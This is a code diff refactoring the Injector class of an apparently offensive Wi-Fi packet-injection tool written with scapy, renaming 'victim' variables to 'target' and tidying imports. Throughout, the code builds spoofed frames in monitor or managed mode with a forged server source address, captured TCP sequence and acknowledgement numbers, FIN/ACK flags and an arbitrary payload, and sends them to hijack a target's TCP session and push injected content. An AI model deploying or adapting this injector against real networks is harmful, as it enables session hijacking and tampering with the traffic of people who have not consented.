@@ -1,19 +1,13 @@
 import scapy.arch
-import fcntl
-import socket
-import struct
-import sys
 import time
-from binascii import unhexlify
 from lib.headers import Headers
 from lib.visuals import Bcolors
-from scapy.config import *                                                      ### Need to scope down at some point in the future
+from scapy.config import conf
 from scapy.layers.dot11 import RadioTap, Dot11, Dot11QoS
 from scapy.layers.inet import IP, TCP
 from scapy.layers.l2 import Ether, LLC, SNAP
 from scapy.packet import Padding, Raw
 from scapy.sendrecv import __gen_send as gs
-from scapy.utils import wrpcap
 
 class Injector(object):
     """Uses scapy to inject packets on the networks"""
@@ -27,12 +21,12 @@ class Injector(object):
             self.injMac = scapy.arch.get_if_hwaddr(interface)
 
     def inject(self,
-               vicmac,
+               tgtmac,
                rtrmac,
                dstmac,
-               vicip,
+               tgtip,
                svrip,
-               vicport,
+               tgtport,
                svrport,
                acknum,
                seqnum,
@@ -44,72 +38,73 @@ class Injector(object):
         This method is where the actual packet is created for sending things
         such as the payload and associated flags.
 
-        FIN/ACK flag is sent to the victim with this method.
+        FIN/ACK flag is sent to the target with this method.
         """
 
         ## Headers
         headers = self.hdr.default(injection)
 
         if self.args.tun is False:
-            ## Monitor
+
+            ## Monitor injection
             if self.args.inj == 'mon':
                 packet = RadioTap()\
                          /Dot11(
-                               FCfield = 'from-DS',
-                               addr1 = vicmac,
-                               addr2 = rtrmac,
-                               addr3 = dstmac
+                                FCfield = 'from-DS',
+                                addr1 = tgtmac,
+                                addr2 = rtrmac,
+                                addr3 = dstmac
                                )\
                          /LLC()\
                          /SNAP()\
                          /IP(
-                            dst = vicip,
-                            src = svrip
+                             dst = tgtip,
+                             src = svrip
                             )\
                          /TCP(
-                             flags = 'FA',
-                             sport = int(svrport),
-                             dport = int(vicport),
-                             seq = int(seqnum),
-                             ack = int(acknum)
+                              flags = 'FA',
+                              sport = int(svrport),
+                              dport = int(tgtport),
+                              seq = int(seqnum),
+                              ack = int(acknum)
                              )\
                          /Raw(
-                             load = headers + injection
+                              load = headers + injection
                              )
 
                 if TSVal is not None and TSecr is not None:
                     packet[TCP].options = [
-                                          ('NOP', None),
-                                          ('NOP', None),
-                                          ('Timestamp', ((round(time.time()), TSVal)))
+                                           ('NOP', None),
+                                           ('NOP', None),
+                                           ('Timestamp', ((round(time.time()), TSVal)))
                                           ]
                 else:
                     packet[TCP].options = [
-                                          ('NOP', None),
-                                          ('NOP', None),
-                                          ('Timestamp', ((round(time.time()), 0)))
+                                           ('NOP', None),
+                                           ('NOP', None),
+                                           ('Timestamp', ((round(time.time()), 0)))
                                           ]
             ## Managed injection
             else:
                 headers = self.hdr.default(injection)
-                packet = Ether(\
-                              src = self.injMac,\
-                              dst = vicmac\
+                packet = Ether(
+                               src = self.injMac,\
+                               dst = tgtmac\
                               )\
-                        /IP(
-                            dst = vicip,
-                            src = svrip
-                            )\
-                        /TCP(
-                            flags = 'FA',
-                            sport = int(svrport),
-                            dport = int(vicport),
-                            seq = int(seqnum),
-                            ack = int(acknum)
-                            )\
-                        /Raw(
-                            load = headers + injection
-                            )
+                         /IP(
+                             dst = tgtip,
+                             src = svrip
+                             )\
+                         /TCP(
+                              flags = 'FA',
+                              sport = int(svrport),
+                              dport = int(tgtport),
+                              seq = int(seqnum),
+                              ack = int(acknum)
+                             )\
+                         /Raw(
+                              load = headers + injection
+                             )
 
                 if TSVal is not None:
                     packet[TCP].options = [\
@@ -128,36 +123,36 @@ class Injector(object):
         else:
             try:
                 headers = self.hdr.default(injection)
-                packet = Ether(\
-                              src = self.injMac,\
-                              dst = vicmac\
+                packet = Ether(
+                               src = self.injMac,\
+                               dst = tgtmac\
                               )\
-                        /IP(
-                            dst = vicip,
-                            src = svrip
+                         /IP(
+                             dst = tgtip,
+                             src = svrip
                             )\
-                        /TCP(
-                            flags = 'FA',
-                            sport = int(svrport),
-                            dport = int(vicport),
-                            seq = int(seqnum),
-                            ack = int(acknum)
-                            )\
-                        /Raw(
-                            load = headers + injection
-                            )
+                         /TCP(
+                              flags = 'FA',
+                              sport = int(svrport),
+                              dport = int(tgtport),
+                              seq = int(seqnum),
+                              ack = int(acknum)
+                             )\
+                         /Raw(
+                              load = headers + injection
+                             )
 
                 if TSVal is not None:
-                    packet[TCP].options = [\
-                                          ('NOP', None),\
-                                          ('NOP', None),\
-                                          ('Timestamp', ((round(time.time()), TSVal)))\
+                    packet[TCP].options = [
+                                           ('NOP', None),\
+                                           ('NOP', None),\
+                                           ('Timestamp', ((round(time.time()), TSVal)))\
                                           ]
                 else:
-                    packet[TCP].options = [\
-                                          ('NOP', None),\
-                                          ('NOP', None),\
-                                          ('Timestamp', ((round(time.time()), 0)))\
+                    packet[TCP].options = [
+                                           ('NOP', None),\
+                                           ('NOP', None),\
+                                           ('Timestamp', ((round(time.time()), 0)))\
                                           ]
             except Exception as E:
                 print(E)
@@ -165,6 +160,6 @@ class Injector(object):
         ## Inject
         try:
             gs(self.injSocket, packet, verbose = False)
-            print('[*] Packet injected to {0}'.format(vicmac))
+            print('[*] Packet injected to {0}'.format(tgtmac))
         except Exception as E:
             print(E)
